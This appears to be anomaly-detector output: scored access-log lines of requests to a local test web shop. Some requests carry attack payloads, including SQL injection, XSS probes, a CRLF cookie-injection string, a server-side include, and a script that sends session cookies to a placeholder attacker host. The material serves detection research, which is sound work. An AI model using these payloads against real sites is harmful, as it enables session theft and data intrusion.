score_content,score_session,score_fused,line
50.27206039428711,0.7288451194763184,25.500452756881714,localhost:8080 - - [10/Jan/2025:15:29:35 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=student&password=ali0557ra&nombre=Jaled&apellidos=Miralles+Casola&email=manni%40yiutuve.mk&dni=37782618N&direccion=Travessera+De+Gracia+53+&ciudad=Tollos&cp=23264&provincia=Barcelo*na&ntc=5024784015351535&B1=Registrar HTTP/1.1 HTTP/1.1" 200 891 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,0.7301846742630005,1.9259946942329407,localhost:8080 - - [10/Jan/2025:15:29:35 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
50.62800598144531,0.8066722750663757,25.717339128255844,localhost:8080 - - [10/Jan/2025:15:29:35 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=student&password=ali0557ra&nombre=Jaled&apellidos=Miralles+Casola&email=manni%40yiutuve.mk&dni=37782618N&direccion=Travessera+De+Gracia+53+&ciudad=Tollos&cp=23264&provincia=Pontevedra&ntcA=5024784015351535&B1=Registrar HTTP/1.1 HTTP/1.1" 200 894 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,0.8077511191368103,1.9647779166698456,localhost:8080 - - [10/Jan/2025:15:29:35 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
5.4529242515563965,0.8234408497810364,3.1381825506687164,localhost:8080 - - [10/Jan/2025:15:29:36 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,0.835107147693634,1.9535681307315826,localhost:8080 - - [10/Jan/2025:15:29:36 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.18946652114391327,0.7966545224189758,0.49306052178144455,localhost:8080 - - [10/Jan/2025:15:29:36 +0000] "GET http://localhost:8080.BAK HTTP/1.1 HTTP/1.1" 200 102 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.4864522218704224,0.9012802243232727,1.1938662230968475,localhost:8080 - - [10/Jan/2025:15:29:36 +0000] "GET http://localhost:8080/tienda1/asf-logo-wide~ HTTP/1.1 HTTP/1.1" 200 159 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.4408663511276245,0.7809147238731384,1.1108905375003815,localhost:8080 - - [10/Jan/2025:15:29:37 +0000] "GET http://localhost:8080/tienda1/global/creditos.jsp/4861362529278789730.java HTTP/1.1 HTTP/1.1" 200 249 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.22602993249893188,0.7832120060920715,0.5046209692955017,localhost:8080 - - [10/Jan/2025:15:29:37 +0000] "GET http://localhost:8080/jstl-war/index.html HTTP/1.1 HTTP/1.1" 200 150 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.0069619417190552,0.7641388177871704,0.8855503797531128,localhost:8080 - - [10/Jan/2025:15:29:37 +0000] "GET http://localhost:8080/tienda1/global/menum.jsp/4861362529278789730 HTTP/1.1 HTTP/1.1" 200 225 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.1602260172367096,0.7520993947982788,0.4561627060174942,localhost:8080 - - [10/Jan/2025:15:29:37 +0000] "GET http://localhost:8080/admin.nsf HTTP/1.1 HTTP/1.1" 200 120 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.16199034452438354,0.7374173402786255,0.4497038424015045,localhost:8080 - - [10/Jan/2025:15:29:38 +0000] "GET http://localhost:8080/tienda1.Old HTTP/1.1 HTTP/1.1" 200 126 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.6265002489089966,0.7208222150802612,1.173661231994629,localhost:8080 - - [10/Jan/2025:15:29:38 +0000] "GET http://localhost:8080/tienda1/miembros/index.jsp/6909030637832563290.jsp.java HTTP/1.1 HTTP/1.1" 200 258 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
55.0068244934082,0.8223876953125,27.91460609436035,localhost:8080 - - [10/Jan/2025:15:29:38 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=marymarg&password=m1r66m7%24o&nombre=Barbarina&apellidos=Hodzic+Fajardo&email=bibb%40yksoluap.io&dni=A097A2A7Q&direccion=Carlos+Piornos+41+11E&ciudad=Sant+Boi+de+Llobregat&cp=46507&provincia=Zamora&ntc=5592242504094790&B1=Registrar HTTP/1.1 HTTP/1.1" 200 930 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0962166786193848,0.8407261371612549,1.9684714078903198,localhost:8080 - - [10/Jan/2025:15:29:38 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
55.38069152832031,0.8371052145957947,28.108898371458054,localhost:8080 - - [10/Jan/2025:15:29:39 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=marymarg&password=m1r66m7%24o&nombre=Barbarina&apellidos=Hodzic+Fajardo&email=bibb%40yksoluap.io&dni=05554476E&direccionA=Carlos+Piornos+41+11E&ciudad=Sant+Boi+de+Llobregat&cp=46507&provincia=Zamora&ntc=5592242504094790&B1=Registrar HTTP/1.1 HTTP/1.1" 200 933 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0962166786193848,0.8388221263885498,1.9675194025039673,localhost:8080 - - [10/Jan/2025:15:29:39 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.49160507321357727,0.7026302218437195,0.5971176475286484,localhost:8080 - - [10/Jan/2025:15:29:39 +0000] "GET http://localhost:8080/tienda1/4861362529278789730.old HTTP/1.1 HTTP/1.1" 200 186 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.522861897945404,0.687343955039978,0.605102926492691,localhost:8080 - - [10/Jan/2025:15:29:39 +0000] "GET http://localhost:8080/tienda1/6909030637832563290.jsp~ HTTP/1.1 HTTP/1.1" 200 189 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
11.448291778564453,1.8185296058654785,6.633410692214966,localhost:9090 - - [10/Jan/2025:15:29:40 +0000] "PUT http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
10.429530143737793,0.614868700504303,5.522199422121048,localhost:8080 - - [10/Jan/2025:15:29:40 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=28&B1=%22+AND+%221%22%3D%221 HTTP/1.1 HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,0.6161801218986511,1.8441046178340912,localhost:8080 - - [10/Jan/2025:15:29:40 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
10.177067756652832,0.5421783328056335,5.359623044729233,localhost:8080 - - [10/Jan/2025:15:29:40 +0000] "GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidadA=28&B1=A%F1adir+al+carrito HTTP/1.1 HTTP/1.1" 200 390 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,0.5429373383522034,1.8074832260608673,localhost:8080 - - [10/Jan/2025:15:29:41 +0000] "POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
11.553657531738281,1.8183062076568604,6.685981869697571,localhost:9090 - - [10/Jan/2025:15:29:41 +0000] "PUT http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
9.336993217468262,0.5464439988136292,4.941718608140945,localhost:8080 - - [10/Jan/2025:15:29:41 +0000] "GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=trindy&pwd=pinTOR&remember=off%2F&B1=Entrar HTTP/1.1 HTTP/1.1" 200 369 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.17718505859375,0.5463975667953491,1.8617913126945496,localhost:8080 - - [10/Jan/2025:15:29:41 +0000] "POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 HTTP/1.1" 200 183 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
5.2638726234436035,0.5573887825012207,2.910630702972412,localhost:8080 - - [10/Jan/2025:15:29:42 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1 HTTP/1.1" 200 216 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.3401055335998535,0.4523024559020996,1.8962039947509766,localhost:8080 - - [10/Jan/2025:15:29:42 +0000] "POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 HTTP/1.1" 200 198 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.646164059638977,0.5719925165176392,1.109078288078308,localhost:8080 - - [10/Jan/2025:15:29:42 +0000] "GET http://localhost:8080/tienda1/publico/asf-logo-wide HTTP/1.1 HTTP/1.1" 200 180 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.823276698589325,0.569736659526825,0.696506679058075,localhost:8080 - - [10/Jan/2025:15:29:42 +0000] "GET http://localhost:8080/tienda1/publico/caracteristicas.jsp.java HTTP/1.1 HTTP/1.1" 200 213 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
17.570405960083008,0.6050083041191101,9.087707132101059,localhost:8080 - - [10/Jan/2025:15:29:43 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2 HTTP/1.1 HTTP/1.1" 200 531 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,0.6184603571891785,1.8452447354793549,localhost:8080 - - [10/Jan/2025:15:29:43 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
6.4315505027771,0.6328660249710083,3.532208263874054,localhost:8080 - - [10/Jan/2025:15:29:43 +0000] "GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1 HTTP/1.1" 200 276 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,0.651336133480072,1.8616826236248016,localhost:8080 - - [10/Jan/2025:15:29:43 +0000] "POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.3869599103927612,0.672275185585022,1.0296175479888916,localhost:8080 - - [10/Jan/2025:15:29:44 +0000] "GET http://localhost:8080/theme HTTP/1.1 HTTP/1.1" 200 108 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.6911530494689941,0.6558578610420227,1.1735054552555084,localhost:8080 - - [10/Jan/2025:15:29:44 +0000] "GET http://localhost:8080/tienda1/publico/miembros.jsp/6909030637832563290.jsp.Old HTTP/1.1 HTTP/1.1" 200 261 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
15.566668510437012,0.5817486643791199,8.074208587408066,localhost:8080 - - [10/Jan/2025:15:29:44 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4320any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=Pasar+por+caja HTTP/1.1 HTTP/1.1" 200 498 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.049243927001953,0.5825902223587036,1.8159170746803284,localhost:8080 - - [10/Jan/2025:15:29:44 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
7.310236930847168,0.6009448170661926,3.9555908739566803,localhost:8080 - - [10/Jan/2025:15:29:45 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4320&B1=Pasar+por+caja%2F HTTP/1.1 HTTP/1.1" 200 309 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.049243927001953,0.6189508438110352,1.8340973854064941,localhost:8080 - - [10/Jan/2025:15:29:45 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
7.138014316558838,0.6129518151283264,3.875483065843582,localhost:8080 - - [10/Jan/2025:15:29:45 +0000] "GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4320&B1A=Pasar+por+caja HTTP/1.1 HTTP/1.1" 200 303 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.049243927001953,0.614148736000061,1.831696331501007,localhost:8080 - - [10/Jan/2025:15:29:45 +0000] "POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 HTTP/1.1" 200 168 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.593509554862976,0.710418701171875,1.1519641280174255,localhost:8080 - - [10/Jan/2025:15:29:46 +0000] "GET http://localhost:8080/tienda1/4861362529278789730 HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
62.345985412597656,0.8087311387062073,31.57735827565193,localhost:8080 - - [10/Jan/2025:15:29:46 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jada&password=0a3gan861&nombre=AsadAND+1%3D1&apellidos=Tarraubella+Grajera&email=seward_sepulvede%40promotorareina.bt&dni=05599581R&direccion=Cuesta+Del+Mercadillo%2C+30+&ciudad=Valdemeca&cp=44367&provincia=Palencia&ntc=2588788031004045&B1=Registrar HTTP/1.1 HTTP/1.1" 200 987 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,0.8040410876274109,1.9629229009151459,localhost:8080 - - [10/Jan/2025:15:29:46 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
132.95352172851562,1.0315940380096436,66.99255788326263,localhost:8080 - - [10/Jan/2025:15:29:46 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jada&password=0a3gan861&nombre=Asad&apellidos=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&email=seward_sepulvede%40promotorareina.bt&dni=05599581R&direccion=Cuesta+Del+Mercadillo%2C+30+&ciudad=Valdemeca&cp=44367&provincia=Palencia&ntc=2588788031004045&B1=Registrar HTTP/1.1 HTTP/1.1" 200 1413 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,1.0318033695220947,2.076804041862488,localhost:8080 - - [10/Jan/2025:15:29:47 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
59.19515609741211,1.126265048980713,30.16071057319641,localhost:8080 - - [10/Jan/2025:15:29:47 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jada&password=0a3gan861&nombre=Asad&apellidos=Tarraubella+Grajera&email=seward_sepulvede%40promotorareina.bt&dni=577B80594V&direccion=Cuesta+Del+Mercadillo%2C+30+&ciudad=Valdemeca&cp=44367&provincia=Palencia&ntc=2588788031004045&B1=Registrar HTTP/1.1 HTTP/1.1" 200 963 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,1.0233125686645508,2.072558641433716,localhost:8080 - - [10/Jan/2025:15:29:47 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
59.19515609741211,1.1339197158813477,30.16453790664673,localhost:8080 - - [10/Jan/2025:15:29:47 +0000] "GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jada&password=0a3gan861&nombre=Asad&apellidos=Tarraubella+Grajera&email=seward_sepulvede%40promotorareina.bt&dni=05599581R&direccionA=Cuesta+Del+Mercadillo%2C+30+&ciudad=Valdemeca&cp=44367&provincia=Palencia&ntc=2588788031004045&B1=Registrar HTTP/1.1 HTTP/1.1" 200 963 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.121804714202881,1.1147522926330566,2.1182785034179688,localhost:8080 - - [10/Jan/2025:15:29:48 +0000] "POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 HTTP/1.1" 200 177 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.22602993249893188,1.1002554893493652,0.6631427109241486,localhost:8080 - - [10/Jan/2025:15:29:48 +0000] "GET http://localhost:8080/tienda1/publico.INC HTTP/1.1 HTTP/1.1" 200 150 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
5.664259910583496,1.099061131477356,3.381660521030426,localhost:8080 - - [10/Jan/2025:15:29:48 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%2520 HTTP/1.1 HTTP/1.1" 200 240 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,1.1004289388656616,2.0862290263175964,localhost:8080 - - [10/Jan/2025:15:29:48 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
5.4529242515563965,0.9917833209037781,3.2223537862300873,localhost:8080 - - [10/Jan/2025:15:29:49 +0000] "GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1 HTTP/1.1" 200 228 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0720291137695312,1.0098742246627808,2.040951669216156,localhost:8080 - - [10/Jan/2025:15:29:49 +0000] "POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 HTTP/1.1" 200 171 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.3825421333312988,1.0994689464569092,1.241005539894104,localhost:8080 - - [10/Jan/2025:15:29:49 +0000] "GET http://localhost:8080/asf-logo-wide HTTP/1.1 HTTP/1.1" 200 132 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
0.7397802472114563,1.082601547241211,0.9111908972263336,localhost:8080 - - [10/Jan/2025:15:29:49 +0000] "GET http://localhost:8080/tienda1/global/6909030637832563290.jsp HTTP/1.1 HTTP/1.1" 200 207 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
1.8934329748153687,1.063676118850708,1.4785545468330383,localhost:8080 - - [10/Jan/2025:15:29:50 +0000] "GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg/asf-logo-wide.gif/.inc HTTP/1.1 HTTP/1.1" 200 270 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
53.893497467041016,1.147810459136963,27.52065396308899,localhost:8080 - - [10/Jan/2025:15:29:50 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kelli&password=resca%F1o&nombre=An%EDcar&apellidos=Bastus+Pellini&email=wiley%40pintandomucho.va&dni=65763257R&direccion=C%2F+Cases+Noves%2C+98%2C+&ciudad=Gomesende&cp=41540&provincia=%C1vila%7C&ntc=2592750778275929&B1=Registrar HTTP/1.1 HTTP/1.1" 200 921 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0962166786193848,1.14664888381958,2.1214327812194824,localhost:8080 - - [10/Jan/2025:15:29:50 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
71.89608764648438,1.2640594244003296,36.58007353544235,localhost:8080 - - [10/Jan/2025:15:29:50 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kelli&password=resca%F1o&nombre=An%EDcar&apellidos=Bastus+Pellini&email=wiley%40pintandomucho.va&dni=65763257R&direccion=C%2F+Cases+Noves%2C+98%2C+&ciudad=Gomesende&cp=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&provincia=%C1vila&ntc=2592750778275929&B1=Registrar HTTP/1.1 HTTP/1.1" 200 1056 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0962166786193848,1.1619739532470703,2.1290953159332275,localhost:8080 - - [10/Jan/2025:15:29:51 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
55.38069152832031,1.1476943492889404,28.264192938804626,localhost:8080 - - [10/Jan/2025:15:29:51 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kelli&password=resca%F1o&nombre=An%EDcar&apellidos=Bastus+Pellini&email=wiley%40pintandomucho.va&dni=65763257R&direccion=C%2F+Cases+Noves%2C+98%2C+&ciudad=Gomesende&cp=41540&provincia=G%2Buadalajara&ntc=2592750778275929&B1=Registrar HTTP/1.1 HTTP/1.1" 200 933 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
3.0962166786193848,1.1498143672943115,2.123015522956848,localhost:8080 - - [10/Jan/2025:15:29:51 +0000] "POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 HTTP/1.1" 200 174 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
53.15818786621094,1.0019415616989136,27.080064713954926,localhost:8080 - - [10/Jan/2025:15:29:51 +0000] "GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kelli&password=resca%F1o&nombre=An%EDcar&apellidos=Bastus+Pellini&email=wiley%40pintandomucho.va&dni=65763257R&direccion=C%2F+Cases+Noves%2C+98%2C+&ciudad=Gomesende&cpA=41540&provincia=%C1vila&ntc=2592750778275929&B1=Registrar HTTP/1.1 HTTP/1.1" 200 915 "-" "Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko)"
